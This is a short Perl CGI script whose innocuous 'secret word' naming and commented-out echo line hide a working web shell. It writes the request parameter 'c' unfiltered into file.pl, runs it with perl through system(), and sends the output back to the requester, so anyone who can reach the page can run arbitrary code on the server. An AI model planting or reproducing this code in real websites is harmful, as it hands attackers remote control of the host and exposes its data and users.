#!C:\perl\bin\perl -w
use CGI;

$query = new CGI;

$secretword = $query->param('c');
$remotehost = $query->remote_host();
open(DATA, ">file.pl")  or die("Couldn't open output file: $!");
print DATA "$secretword";
close(DATA);
system("perl file.pl > output.txt");
open(OUTPUT, "<output.txt");
print $query->header;
#print "<p>The secret word is <b>$secretword</b> and your IP is <b>$remotehost</b>.</p>";
while(<OUTPUT>) {
   print $_ . "\n";
}
close(OUTPUT);

